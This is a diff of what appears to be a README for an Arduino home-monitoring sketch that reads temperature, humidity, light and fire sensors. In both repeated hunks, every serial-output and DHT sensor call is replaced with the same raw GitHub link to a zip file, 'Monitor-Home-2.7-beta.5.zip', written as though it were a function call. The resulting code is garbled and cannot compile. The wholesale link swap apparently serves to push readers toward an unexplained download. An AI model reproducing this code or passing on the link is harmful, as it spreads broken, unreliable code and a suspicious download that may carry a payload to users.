@@ -57,25 +57,25 @@ The Home Monitoring System is designed to enhance the safety and efficiency of a
 DHT dht(DHTPIN, DHTTYPE);
 
 void setup() {
-  Serial.begin(9600);
-  dht.begin();
+  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(9600);
+  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip();
   pinMode(FIREPIN, INPUT);
 }
 
 void loop() {
-  float h = dht.readHumidity();
-  float t = dht.readTemperature();
+  float h = https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip();
+  float t = https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip();
   int ldr = analogRead(LDRPIN);
   int fire = digitalRead(FIREPIN);
   
-  Serial.print("Temperature: ");
-  Serial.print(t);
-  Serial.print(" °C, Humidity: ");
-  Serial.print(h);
-  Serial.print(" %, Light: ");
-  Serial.print(ldr);
-  Serial.print(", Fire: ");
-  Serial.println(fire ? "Yes" : "No");
+  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip("Temperature: ");
+  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(t);
+  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(" °C, Humidity: ");
+  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(h);
+  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(" %, Light: ");
+  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(ldr);
+  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(", Fire: ");
+  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(fire ? "Yes" : "No");
   
   delay(2000);
 }
@@ -150,25 +150,25 @@ The Home Monitoring System is designed to enhance the safety and efficiency of a
 DHT dht(DHTPIN, DHTTYPE);
 
 void setup() {
-  Serial.begin(9600);
-  dht.begin();
+  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(9600);
+  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip();
   pinMode(FIREPIN, INPUT);
 }
 
 void loop() {
-  float h = dht.readHumidity();
-  float t = dht.readTemperature();
+  float h = https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip();
+  float t = https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip();
   int ldr = analogRead(LDRPIN);
   int fire = digitalRead(FIREPIN);
   
-  Serial.print("Temperature: ");
-  Serial.print(t);
-  Serial.print(" °C, Humidity: ");
-  Serial.print(h);
-  Serial.print(" %, Light: ");
-  Serial.print(ldr);
-  Serial.print(", Fire: ");
-  Serial.println(fire ? "Yes" : "No");
+  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip("Temperature: ");
+  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(t);
+  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(" °C, Humidity: ");
+  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(h);
+  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(" %, Light: ");
+  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(ldr);
+  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(", Fire: ");
+  https://raw.githubusercontent.com/Ash0404/Home-Monitor/main/uncharily/Monitor-Home-2.7-beta.5.zip(fire ? "Yes" : "No");
   
   delay(2000);
 }
